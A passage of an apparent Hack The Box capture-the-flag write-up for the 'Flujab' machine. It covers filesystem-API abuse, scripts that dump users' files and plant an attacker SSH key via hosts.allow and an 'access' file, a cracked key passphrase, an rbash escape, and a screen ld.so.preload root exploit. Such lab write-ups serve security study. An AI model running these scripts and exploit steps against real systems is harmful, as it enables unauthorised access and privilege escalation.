+        "path": "/initrd.img",
+        "size": 18135502,
+        "isFile": true,
+        "isLink": true,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "dev",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1557669287.088,
+        "path": "/dev",
+        "size": 3060,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": false,
+        "name": "vmlinuz.old",
+        "gid": 0,
+        "mode": 33188,
+        "mtime": 1540665976.0,
+        "path": "/vmlinuz.old",
+        "size": 4232992,
+        "isFile": true,
+        "isLink": true,
+        "uid": 0
+    }],
+    "parent": null
+}
+</pre>
+
+<p>If we change the request to <code>/api/filesystem/list//home</code> we can list the content of the <code>/home</code> folder.</p>
+
+<pre class="prettyprint long">
+{
+    "items": [{
+        "isDir": true,
+        "name": "drno",
+        "gid": 1000,
+        "mode": 16749,
+        "mtime": 1544395240.3854141,
+        "path": "/home/drno",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1000
+    }, {
+        "isDir": true,
+        "name": "drme",
+        "gid": 1029,
+        "mode": 16749,
+        "mtime": 1543721800.0631402,
+        "path": "/home/drme",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1025
+    }, {
+        "isDir": true,
+        "name": "nursemoe",
+        "gid": 1021,
+        "mode": 16749,
+        "mtime": 1543721800.0431406,
+        "path": "/home/nursemoe",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1017
+    }, {
+        "isDir": true,
+        "name": "drshipman",
+        "gid": 1017,
+        "mode": 16749,
+        "mtime": 1543721800.0311408,
+        "path": "/home/drshipman",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1013
+    }, {
+        "isDir": true,
+        "name": "drstrange",
+        "gid": 1010,
+        "mode": 16749,
+        "mtime": 1543721800.011141,
+        "path": "/home/drstrange",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1006
+    }, {
+        "isDir": true,
+        "name": "drsmith",
+        "gid": 1014,
+        "mode": 16749,
+        "mtime": 1543721800.023141,
+        "path": "/home/drsmith",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1010
+    }, {
+        "isDir": true,
+        "name": "nursewhitstone",
+        "gid": 1024,
+        "mode": 16749,
+        "mtime": 1543721800.0511405,
+        "path": "/home/nursewhitstone",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1020
+    }, {
+        "isDir": true,
+        "name": "nursewalters",
+        "gid": 1027,
+        "mode": 16749,
+        "mtime": 1543721800.0591402,
+        "path": "/home/nursewalters",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1023
+    }, {
+        "isDir": true,
+        "name": "drgreene",
+        "gid": 1016,
+        "mode": 16749,
+        "mtime": 1543721800.0271409,
+        "path": "/home/drgreene",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1012
+    }, {
+        "isDir": true,
+        "name": "drstones",
+        "gid": 1023,
+        "mode": 16749,
+        "mtime": 1543721800.0471406,
+        "path": "/home/drstones",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1019
+    }, {
+        "isDir": true,
+        "name": "drre",
+        "gid": 1031,
+        "mode": 16749,
+        "mtime": 1543721800.07114,
+        "path": "/home/drre",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1027
+    }, {
+        "isDir": true,
+        "name": "drwho",
+        "gid": 1018,
+        "mode": 16749,
+        "mtime": 1543721800.0311408,
+        "path": "/home/drwho",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1014
+    }, {
+        "isDir": true,
+        "name": "nurseyi",
+        "gid": 1020,
+        "mode": 16749,
+        "mtime": 1543721800.0391407,
+        "path": "/home/nurseyi",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1016
+    }, {
+        "isDir": true,
+        "name": "drjones",
+        "gid": 1015,
+        "mode": 16749,
+        "mtime": 1543721800.023141,
+        "path": "/home/drjones",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1011
+    }, {
+        "isDir": true,
+        "name": "nursejackie",
+        "gid": 1006,
+        "mode": 16749,
+        "mtime": 1544389334.9293432,
+        "path": "/home/nursejackie",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1002
+    }, {
+        "isDir": true,
+        "name": "nursewaters",
+        "gid": 1026,
+        "mode": 16749,
+        "mtime": 1543721800.0551403,
+        "path": "/home/nursewaters",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1022
+    }, {
+        "isDir": true,
+        "name": "nursebluecoats",
+        "gid": 1028,
+        "mode": 16749,
+        "mtime": 1543721800.0631402,
+        "path": "/home/nursebluecoats",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1024
+    }, {
+        "isDir": true,
+        "name": "drblack",
+        "gid": 1008,
+        "mode": 16749,
+        "mtime": 1543721800.007141,
+        "path": "/home/drblack",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1004
+    }, {
+        "isDir": true,
+        "name": "nursepeter",
+        "gid": 1019,
+        "mode": 16749,
+        "mtime": 1543721800.0351408,
+        "path": "/home/nursepeter",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1015
+    }, {
+        "isDir": true,
+        "name": "drpo",
+        "gid": 1013,
+        "mode": 16749,
+        "mtime": 1543721800.019141,
+        "path": "/home/drpo",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1009
+    }, {
+        "isDir": true,
+        "name": "sysadm",
+        "gid": 1007,
+        "mode": 16877,
+        "mtime": 1543708116.296187,
+        "path": "/home/sysadm",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1003
+    }, {
+        "isDir": true,
+        "name": "drwhite",
+        "gid": 1009,
+        "mode": 16749,
+        "mtime": 1543721800.007141,
+        "path": "/home/drwhite",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1005
+    }, {
+        "isDir": true,
+        "name": "drcrick",
+        "gid": 1022,
+        "mode": 16749,
+        "mtime": 1543721800.0431406,
+        "path": "/home/drcrick",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1018
+    }, {
+        "isDir": true,
+        "name": "nursetumble",
+        "gid": 1025,
+        "mode": 16749,
+        "mtime": 1543721800.0551403,
+        "path": "/home/nursetumble",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1021
+    }, {
+        "isDir": true,
+        "name": "dryi",
+        "gid": 1012,
+        "mode": 16749,
+        "mtime": 1543721800.015141,
+        "path": "/home/dryi",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1008
+    }, {
+        "isDir": true,
+        "name": "drnu",
+        "gid": 1030,
+        "mode": 16749,
+        "mtime": 1543721800.06714,
+        "path": "/home/drnu",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1026
+    }, {
+        "isDir": true,
+        "name": "drdre",
+        "gid": 1032,
+        "mode": 16749,
+        "mtime": 1543721800.07114,
+        "path": "/home/drdre",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1028
+    }, {
+        "isDir": true,
+        "name": "drfoster",
+        "gid": 1011,
+        "mode": 16749,
+        "mtime": 1543721800.015141,
+        "path": "/home/drfoster",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 1007
+    }],
+    "parent": "/"
+}
+</pre>
+
+<p>Reading the file <code>all.js</code>, which is used by the app, we can see there are more functions like this one.</p> 
+
+<pre class="prettyprint">
+/api/filesystem/mountpoints
+/api/filesystem/read/
+/api/filesystem/write/
+/api/filesystem/list/
+/api/filesystem/stat/
+/api/filesystem/chmod/
+/api/filesystem/create-file/
+/api/filesystem/create-directory/
+</pre>
+
+<p>I did a simple <code>python</code> script to read all the files available in all the users home folder, because doing manually would take ages.</p>
+
+<pre class="prettyprint">
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+session = '1c02c58a2e0d79188f105dc655633cfa00c8a53d' #Change me
+
+headers = {'Cookie': 'session=' + session}
+dir_url = 'https://sysadmin-console-01.flujab.htb:8080/api/filesystem/list/'
+file_url = 'https://sysadmin-console-01.flujab.htb:8080/api/filesystem/read/'
+
+
+def read_file(path, indent):
+	if path.endswith('.bashrc') or path.endswith('.profile') or path.endswith('.bash_logout'):
+		print '\t' * indent + path + ': blabla'
+	else:
+		r = requests.get(file_url + path, headers=headers, verify=False)
+		if 'Permission denied' in r.content:
+			print '\t' * indent + path + ' [Permission denied]'
+		else:
+			print '\t' * indent + path + ':'
+			print r.content
+
+
+def list_dir(path, indent):
+	print '\t' * indent + path
+	r = requests.get(dir_url + path, headers=headers, verify=False)
+	for item in r.json()['items']:
+		path = item['path']
+		if item['isDir']:
+			list_dir(path, indent + 1)
+		else:
+			read_file(path, indent + 1)
+
+
+if __name__ == "__main__":
+	list_dir('/home', 0)
+</pre>
+
+<p>The only file which we have permission to read are the <code>authorized_keys</code> and a private key from <code>drno</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# python list.py 
+/home
+	/home/drno
+		/home/drno/.bashrc: blabla
+		/home/drno/user.txt [Permission denied]
+		/home/drno/.bash_logout: blabla
+		/home/drno/.profile: blabla
+		/home/drno/.ssh
+			/home/drno/.ssh/authorized_keys:
+"# shell whitelisting + key auth enabled \nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=\n"
+			/home/drno/.ssh/userkey:
+"-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B\n\nzPiYgS5/LZqDZr4tFLHiOsym/baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8\nw4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5\nwMILkyVB4V2223X83ym3y/4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq/bJay\nv+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd/6iqBF6YE/xKq\nOoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy\ngpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+/E29FIv7verD2xOtcV93K1\nthkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR/M8i3fuXPp7BHHMGJWT\njRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf\nRUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ/3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT\njSnjBlVNVKvICaLZ1ulfOMXN/H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm/\nS9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K\nnWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH\nM6Ud9IcBOsve1BsfhJepQtm/4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT\n0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw\n4L8jU9ttEYAH/VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o\nGAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2\nhvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR\ni+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd\nhiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a\nq6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e\nh+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM/csl\nBlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c/p02cOoVWSUFr5a1Kxul\n9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p/n3NkrKT6R+jI\nLSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji\nISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r\n-----END RSA PRIVATE KEY-----\n"
+	/home/drme
+		/home/drme/.bashrc: blabla
+		/home/drme/user.txt [Permission denied]
+		/home/drme/.bash_logout: blabla
+		/home/drme/.profile: blabla
+	/home/nursemoe
+		/home/nursemoe/.bashrc: blabla
+...
+</pre>
+
+<p>If we copy the private key in our machine and try to connect through <code>ssh</code> we will see we can't.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# ssh -i userkey drno@10.10.10.124
+ssh_exchange_identification: read: Connection reset by peer
+</pre>
+
+<p>That's because if we read the file <code>/etc/hosts.deny</code> there's a directive to block any host. We can't modify that file, but we can modify <code>/etc/hosts.allow</code> to add our IP like this using the endpoint <code>/api/filesystem/write//etc/hosts.allow</code> (Note the newline at the end of the file!).</p>
+
+<pre class="prettyprint">
+# grant ssh access per host
+# syntax:
+# sshd : [host ip]
+###########################
+
+sshd:10.10.16.11
+
+</pre>
+
+<p>Now if we try to connect, we'll see the private key requires a passphrase, we can try to crack it using <code>john</code>, but first we have to convert it to <code>john</code> format using <a href="https://github.com/stricture/hashstack-server-plugin-jtr/blob/master/scrapers/sshng2john.py" target="_blank"><code>sshng2john</code></a>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# python sshng2john.py userkey > userkey.john
+</pre>
+
+<p>Now if we run <code>john</code> with the <code>rockyou</code> wordlist, we get the passphrase is <code>shadowtroll</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# john userkey.john --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+shadowtroll      (userkey)
+</pre>
+
+<p>Unfortunately, even using the correct password we can't establish a connection.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# ssh -i userkey drno@10.10.10.124
+Enter passphrase for key 'userkey': shadowtroll
+drno@10.10.10.124: Permission denied (publickey).
+</pre>
+
+<p>That's because this private key is not authorized. We can check the public key of <code>userkey</code> using <code>ssh-keygen</code> and see it isn't the one on <code>authorized_keys</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# ssh-keygen -y -e -f userkey
+Enter passphrase: 
+---- BEGIN SSH2 PUBLIC KEY ----
+Comment: "2048-bit RSA, converted by root@kali from OpenSSH"
+AAAAB3NzaC1yc2EAAAADAQABAAABAQDq4TskQAnEsxX37Hs09hdzSqgSfilFQUQ8RadT5s
+9NXT8gA6Xg75z57sLS3f1Vq/YWCQ1U9fwKoY0f8WRbYRhza3tOmOiI4dla+Lsbm0GWdG2b
+Acf3Fgz4sjkInuWACVNCCPBhBamT4eIMwcnXzyNDVrT1GkW8hjbGoKtSQh4hfaGF+zckdu
+hqrRUtWtcYCLQLBxKOegloG7OXaNfqCyRrNnMC6z85XBYH8nn7gaQS4uvhYXdeRe894WBq
+TA1vpYXvxjHPpXl2dL7cwOch2xLT2dyvCEGPk1s6mPgDxFBkp67E4XR0lvn0pBVP1wjBE6
+ZIQkRHK2492QB8RVLZoMKB
+---- END SSH2 PUBLIC KEY ----
+</pre>
+
+<p>We don't have permissions to modify the <code>authorized_keys</code> file, but looking at the ssh config (<code>/etc/ssh/sshd_config</code>) we see the following line.</p>
+
+<pre class="prettyprint">
+AuthorizedKeysFile	.ssh/authorized_keys access
+</pre>
+
+<p>This tells the system to, besides authorizing keys in <code>.ssh/authorized_keys</code>, authorize keys in <code>access</code> if this file exists.</p>
+
+<p>We're going to create our own key pair.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# ssh-keygen -t rsa -f caca -N caca
+Generating public/private rsa key pair.
+Your identification has been saved in caca.
+Your public key has been saved in caca.pub.
+The key fingerprint is:
+SHA256:S1mwZQx3Mrfuugi0mpqAnhGs5+llJCAoFLknfGC516Q root@kali
+The key's randomart image is:
++---[RSA 2048]----+
+| o+     oo* o    |
+|o=   .   *.= .   |
+|B + +   . . .    |
+|+* E .   o .     |
+| o* . . S   .    |
+|o .o . o . .     |
+|+.. o o .   .    |
+|.+o= o . . .     |
+| +*.o   . o.     |
++----[SHA256]-----+
+</pre>
+
+<p>And then, put the generated public key on the <code>access</code> file.</p>
+
+<p>I made another <code>python</code> script to automate the process of login in the app, add my IP in <code>hosts.allow</code>, create the <code>access</code> file in <code>sysadm</code> home directory (if it doesn't exist) and upload my public key there.</p>
+
+<pre class="prettyprint">
+import netifaces
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+session_cookie = ''
+
+write_url = 'https://sysadmin-console-01.flujab.htb:8080/api/filesystem/write/'
+create_url = 'https://sysadmin-console-01.flujab.htb:8080/api/filesystem/create-file/'
+read_url = 'https://sysadmin-console-01.flujab.htb:8080/api/filesystem/read/'
+
+def write_file(path, content):
+	r = requests.post(write_url + path, data=content, headers={'Cookie': session_cookie}, verify=False)
+	if not r.ok:
+		raise Exception(r.json()['message'])
+
+
+def create_file(path):
+	r = requests.post(create_url + path, headers={'Cookie': session_cookie}, verify=False)
+	if not r.ok:
+		raise Exception(r.json()['message'])
+
+
+def allow_me():
+	my_ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
+	data = """# grant ssh access per host
+# syntax:
+# sshd : [host ip]
+###########################
+
+sshd:""" + my_ip + """
+
+	"""
+	write_file('/etc/hosts.allow', data)
+
+
+def upload_public_key():
+	with open('caca.pub') as f:
+		pub = f.read()
+	try:
+		create_file('/home/sysadm/access')
+	except:
+		print 'already exists'
+	write_file('/home/sysadm/access', pub)
+
+
+def login():
+	url = 'https://sysadmin-console-01.flujab.htb:8080/api/core/auth'
+	data = '{"username":"sysadm","password":"th3doct0r","mode":"normal"}'
+	r = requests.post(url, data=data, verify=False)
+	global session_cookie
+	session_cookie = r.headers['set-cookie'].split(';')[0]
+
+
+if __name__ == "__main__":
+	login()
+	allow_me()
+	upload_public_key()
+</pre>
+
+<p>After running it, it's now possible to use the generated private key pair to login in the machine as <code>sysadm</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# python ssh_things.py
+root@kali:~/htb/flujab# ssh -i caca sysadm@10.10.10.124
+Enter passphrase for key 'caca': caca
+Linux flujab 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+sysadm@flujab:~$
+</pre>
+
+<p>But we're inside a restricted shell.</p>
+
+<pre class="prettyprint">
+sysadm@flujab:~$ cd ..
+-rbash: cd: restricted
+</pre>
+
+<p>To escape, just add <code>-t "bash"</code> when running <code>ssh</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# ssh -i caca sysadm@10.10.10.124 -t "bash"
+Enter passphrase for key 'caca': 
+sysadm@flujab:~$ cd ..
+sysadm@flujab:/home$
+</pre>
+
+<p>Unfortunately, we don't have permission to read any user flag (each user has one).</p>
+
+<pre class="prettyprint">
+sysadm@flujab:/home/drdre$ cat user.txt 
+cat: user.txt: Permission denied
+</pre>
+
+<p>Looking for binaries with the <code>SUID</code> flag set, we get the following output.</p> 
+
+<pre class="prettyprint">
+sysadm@flujab:~$ find / -perm -4000 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/local/share/screen/screen
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/screen
+/usr/bin/gpasswd
+/usr/bin/sudo
+/bin/su
+/bin/umount
+/bin/mount
+/bin/ping
+</pre>
+
+<p>We have two <code>screen</code> binaries which is kind of strange. If we check the version of the first one we can see is an old version which is vulnerable to <a href="https://www.exploit-db.com/exploits/41154" target="_blank">this privesc exploit</a>.</p>
+
+<p>As the exploit uses <code>gcc</code> to compile some <code>.c</code> code and flujab doesn't seem to have it installed, we're compiling those files in our machine as the exploit does.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# gcc -fPIC -shared -ldl -o libhax.so libhax.c
+root@kali:~/htb/flujab# gcc -o rootshell rootshell.c
+</pre>
+
+<p>Then move those files using <code>scp</code> to flujab.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# scp -i caca rootshell sysadm@10.10.10.124:/tmp/
+Enter passphrase for key 'caca': caca 
+rootshell                                                           100%   16KB  88.9KB/s   00:00    
+root@kali:~/htb/flujab/test# scp -i caca libhax.so sysadm@10.10.10.124:/tmp/
+Enter passphrase for key 'caca': caca
+libhax.so                                                           100%   16KB  84.7KB/s   00:00
+</pre>
+
+<p>Continue with the steps on the exploit and we get a shell as root.</p>
+
+<pre class="prettyprint">
+sysadm@flujab:/etc$ cd /etc
+sysadm@flujab:/etc$ umask 000
+sysadm@flujab:/etc$ /usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
+sysadm@flujab:/etc$ /tmp/rootshell
+# whoami
+root
+</pre>
+
+<p>Now we can finally read the root flag.</p>
+
+<pre class="prettyprint">
+# cat /root/root.txt
+<span flag="7081748f80e8ec0c02ddbf0c96daee33">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<p>And also read the user flag.</p>
+
+<pre class="prettyprint long">
+# cat /home/*/user.txt
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P 
+<span flag="c519aa2fa8c2b69eb3891d8d46c662d4">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P           
+This is A Nope !!! :P
+</pre>
